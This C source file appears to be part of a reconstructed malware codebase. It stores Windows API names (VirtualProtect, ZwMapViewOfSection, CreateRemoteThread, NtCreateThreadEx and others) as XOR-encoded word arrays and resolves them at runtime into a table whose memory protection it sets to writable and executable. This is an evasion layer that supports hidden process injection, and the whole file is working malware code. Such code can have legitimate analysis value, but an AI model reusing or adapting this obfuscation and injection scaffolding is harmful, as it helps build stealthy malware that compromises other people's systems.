/******************************************************************************************
  Copyright (C) 2012-2014 Christian Roggia <christian.roggia@gmail.com>

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

#include "4. Encoding.h"
#include "9. AssemblyBlock2.h"
#include "A. EncodingAlgorithms.h"

#include "define.h"

const WORD ENCODED_lstrcmpiW[10] =
{
	0xAE7E, 0xAE61, 0xAE66, 0xAE60,
	0xAE71, 0xAE7F, 0xAE62, 0xAE7B,
	0xAE45, 0xAE12
};

const WORD ENCODED_VirtualQuery[13] =
{
	0xAE44, 0xAE7B, 0xAE60, 0xAE66,
	0xAE67, 0xAE73, 0xAE7E, 0xAE43,
	0xAE67, 0xAE77, 0xAE60, 0xAE6B,
	0xAE12
};

const WORD ENCODED_VirtualProtect[15] =
{
	0xAE44, 0xAE7B, 0xAE60, 0xAE66,
	0xAE67, 0xAE73, 0xAE7E, 0xAE42,
	0xAE60, 0xAE7D, 0xAE66, 0xAE77,
	0xAE71, 0xAE66, 0xAE12
};

const WORD ENCODED_GetProcAddress[15] =
{
	0xAE55, 0xAE77, 0xAE66, 0xAE42,
	0xAE60, 0xAE7D, 0xAE71, 0xAE53,
	0xAE76, 0xAE76, 0xAE60, 0xAE77,
	0xAE61, 0xAE61, 0xAE12
};

const WORD ENCODED_MapViewOfFile[14] =
{
	0xAE5F, 0xAE73, 0xAE62, 0xAE44,
	0xAE7B, 0xAE77, 0xAE65, 0xAE5D,
	0xAE74, 0xAE54, 0xAE7B, 0xAE7E,
	0xAE77, 0xAE12
};

const WORD ENCODED_UnmapViewOfFile[16] =
{
	0xAE47, 0xAE7C, 0xAE7F, 0xAE73,
	0xAE62, 0xAE44, 0xAE7B, 0xAE77,
	0xAE65, 0xAE5D, 0xAE74, 0xAE54,
	0xAE7B, 0xAE7E, 0xAE77, 0xAE12
};

const WORD ENCODED_FlushInstructionCache[22] =
{
	0xAE54, 0xAE7E, 0xAE67, 0xAE61,
	0xAE7A, 0xAE5B, 0xAE7C, 0xAE61,
	0xAE66, 0xAE60, 0xAE67, 0xAE71,
	0xAE66, 0xAE7B, 0xAE7D, 0xAE7C,
	0xAE51, 0xAE73, 0xAE71, 0xAE7A,
	0xAE77, 0xAE12
};

const WORD ENCODED_LoadLibraryW[13] =
{
	0xAE5E, 0xAE7D, 0xAE73, 0xAE76,
	0xAE5E, 0xAE7B, 0xAE70, 0xAE60,
	0xAE73, 0xAE60, 0xAE6B, 0xAE45,
	0xAE12
};

const WORD ENCODED_FreeLibrary[12] =
{
	0xAE54, 0xAE60, 0xAE77, 0xAE77,
	0xAE5E, 0xAE7B, 0xAE70, 0xAE60,
	0xAE73, 0xAE60, 0xAE6B, 0xAE12
};

const WORD ENCODED_ZwCreateSection[16] =
{
	0xAE48, 0xAE65, 0xAE51, 0xAE60,
	0xAE77, 0xAE73, 0xAE66, 0xAE77,
	0xAE41, 0xAE77, 0xAE71, 0xAE66,
	0xAE7B, 0xAE7D, 0xAE7C, 0xAE12
};

const WORD ENCODED_ZwMapViewOfSection[19] =
{
	0xAE48, 0xAE65, 0xAE5F, 0xAE73,
	0xAE62, 0xAE44, 0xAE7B, 0xAE77,
	0xAE65, 0xAE5D, 0xAE74, 0xAE41,
	0xAE77, 0xAE71, 0xAE66, 0xAE7B,
	0xAE7D, 0xAE7C, 0xAE12
};

const WORD ENCODED_CreateThread[13] =
{
	0xAE51, 0xAE60, 0xAE77, 0xAE73,
	0xAE66, 0xAE77, 0xAE46, 0xAE7A,
	0xAE60, 0xAE77, 0xAE73, 0xAE76,
	0xAE12
};

const WORD ENCODED_WaitForSingleObject[20] =
{
	0xAE45, 0xAE73, 0xAE7B, 0xAE66,
	0xAE54, 0xAE7D, 0xAE60, 0xAE41,
	0xAE7B, 0xAE7C, 0xAE75, 0xAE7E,
	0xAE77, 0xAE5D, 0xAE70, 0xAE78,
	0xAE77, 0xAE71, 0xAE66, 0xAE12
};

const WORD ENCODED_GetExitCodeThread[18] =
{
	0xAE55, 0xAE77, 0xAE66, 0xAE57,
	0xAE6A, 0xAE7B, 0xAE66, 0xAE51,
	0xAE7D, 0xAE76, 0xAE77, 0xAE46,
	0xAE7A, 0xAE60, 0xAE77, 0xAE73,
	0xAE76, 0xAE12
};

const WORD ENCODED_ZwClose[8] =
{
	0xAE48, 0xAE65, 0xAE51, 0xAE7E,
	0xAE7D, 0xAE61, 0xAE77, 0xAE12
};

const WORD ENCODED_CreateRemoteThread[19] =
{
	0xAE51, 0xAE60, 0xAE77, 0xAE73,
	0xAE66, 0xAE77, 0xAE40, 0xAE77,
	0xAE7F, 0xAE7D, 0xAE66, 0xAE77,
	0xAE46, 0xAE7A, 0xAE60, 0xAE77,
	0xAE73, 0xAE76, 0xAE12
};

const WORD ENCODED_NtCreateThreadEx[17] =
{
	0xAE5C, 0xAE66, 0xAE51, 0xAE60,
	0xAE77, 0xAE73, 0xAE66, 0xAE77,
	0xAE46, 0xAE7A, 0xAE60, 0xAE77,
	0xAE73, 0xAE76, 0xAE57, 0xAE6A,
	0xAE12
};

// 100% (C) CODE MATCH
BOOL DecodeEncryptedModuleNames()
{
	DWORD dwOld;
	
	if(!VirtualProtect((LPVOID)&g_hardAddrs, sizeof(HARDCODED_ADDRESSES), PAGE_EXECUTE_WRITECOPY, &dwOld) &&
	   !VirtualProtect((LPVOID)&g_hardAddrs, sizeof(HARDCODED_ADDRESSES), PAGE_EXECUTE_READWRITE, &dwOld))
		return FALSE;
	
	*(HMODULE*)_F(NTDLL_DLL) = GetModuleNTDLL();
	
	*(DWORD*)_F(lstrcmpiW            ) = (DWORD)GetFunctionFromKERNEL32(ENCODED_lstrcmpiW);
	*(DWORD*)_F(VirtualQuery         ) = (DWORD)GetFunctionFromKERNEL32(ENCODED_VirtualQuery);
	*(DWORD*)_F(VirtualProtect       ) = (DWORD)GetFunctionFromKERNEL32(ENCODED_VirtualProtect);
	*(DWORD*)_F(GetProcAddress       ) = (DWORD)GetFunctionFromKERNEL32(ENCODED_GetProcAddress);
	*(DWORD*)_F(MapViewOfFile        ) = (DWORD)GetFunctionFromKERNEL32(ENCODED_MapViewOfFile);
	*(DWORD*)_F(UnmapViewOfFile      ) = (DWORD)GetFunctionFromKERNEL32(ENCODED_UnmapViewOfFile);
	*(DWORD*)_F(FlushInstructionCache) = (DWORD)GetFunctionFromKERNEL32(ENCODED_FlushInstructionCache);
	*(DWORD*)_F(LoadLibraryW         ) = (DWORD)GetFunctionFromKERNEL32(ENCODED_LoadLibraryW);
	*(DWORD*)_F(FreeLibrary          ) = (DWORD)GetFunctionFromKERNEL32(ENCODED_FreeLibrary);
	*(DWORD*)_F(ZwCreateSection      ) = (DWORD)GetFunctionFromNTDLL(ENCODED_ZwCreateSection);
	*(DWORD*)_F(ZwMapViewOfSection   ) = (DWORD)GetFunctionFromNTDLL(ENCODED_ZwMapViewOfSection);
	*(DWORD*)_F(CreateThread         ) = (DWORD)GetFunctionFromKERNEL32(ENCODED_CreateThread);
	*(DWORD*)_F(WaitForSingleObject  ) = (DWORD)GetFunctionFromKERNEL32(ENCODED_WaitForSingleObject);
	*(DWORD*)_F(GetExitCodeThread    ) = (DWORD)GetFunctionFromKERNEL32(ENCODED_GetExitCodeThread);
	*(DWORD*)_F(ZwClose              ) = (DWORD)GetFunctionFromNTDLL(ENCODED_ZwClose);
	
	return TRUE;
}